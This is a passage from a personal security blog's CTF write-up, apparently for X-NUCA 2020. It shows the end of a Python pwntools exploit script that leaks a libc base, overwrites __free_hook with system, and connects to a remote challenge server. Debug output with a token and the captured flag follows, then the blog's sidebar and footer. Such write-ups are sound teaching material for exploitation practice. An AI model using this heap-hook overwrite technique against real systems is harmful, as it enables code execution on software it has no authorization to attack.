class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line">print(<span class="string">&#x27;double_hex: &#x27;</span> + double_to_hex(<span class="number">1.0</span>))</span><br><span class="line">print(hex_to_double(<span class="number">0x3ff0000000000000</span>))</span><br><span class="line">print(hex_to_double(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span>(LOCAL == <span class="number">0</span>):</span><br><span class="line">		fd = <span class="built_in">open</span>(<span class="string">&#x27;./exp.c&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">		d = fd.read()</span><br><span class="line">		fd.close()</span><br><span class="line">		sla(<span class="string">&#x27;:&#x27;</span>, base64.b64encode(d))</span><br><span class="line">		ru(<span class="string">&#x27;-------------------------------------------------------\n&#x27;</span>)	</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - main_arena - <span class="number">1184</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#target = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0x28</span></span><br><span class="line">	target = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x28</span></span><br><span class="line">	gadget = [<span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line">	one_gadget = libc_base + gadget[<span class="number">0</span>]</span><br><span class="line">	one_gadget = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	t = <span class="built_in">str</span>(hex_to_double(target)).split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">	o = <span class="built_in">str</span>(hex_to_double(one_gadget)).split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">	li(<span class="string">&#x27;target = &#x27;</span> + <span class="built_in">hex</span>(target) + <span class="string">&#x27; double: &#x27;</span> + t)</span><br><span class="line">	li(<span class="string">&#x27;one_gadget = &#x27;</span> + <span class="built_in">hex</span>(one_gadget) + <span class="string">&#x27; double: &#x27;</span> + o)</span><br><span class="line">	db()</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	t = t.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	s(t)</span><br><span class="line">	ru(<span class="string">&#x27;chunk&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	o = o.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	<span class="comment">#for _ in range(2):</span></span><br><span class="line">	s(o)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process([<span class="string">&#x27;exp.c&#x27;</span>], env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span> : libc_path&#125;)</span><br><span class="line">			<span class="comment">#io = elf.process()</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Congratulations,please input your token: $ icq2383351cba441087032e259a726b5</span><br><span class="line">[DEBUG] Sent 0x21 bytes:</span><br><span class="line">    &#39;icq2383351cba441087032e259a726b5\n&#39;</span><br><span class="line">[DEBUG] Received 0x26 bytes:</span><br><span class="line">    &#39;flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;&#39;</span><br><span class="line">flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;[DEBUG] Received 0x37 bytes:</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.i0gan.cn/2020/10/31/wp-xnuca-2020/" data-id="ckhemv83f003swdcmd4mrhrlx" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/11/01/wp-xhb-2020/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          湖湘杯2020
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/10/30/qq-linux-vul-report/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">linux qq 漏洞调试分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 i0gan<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
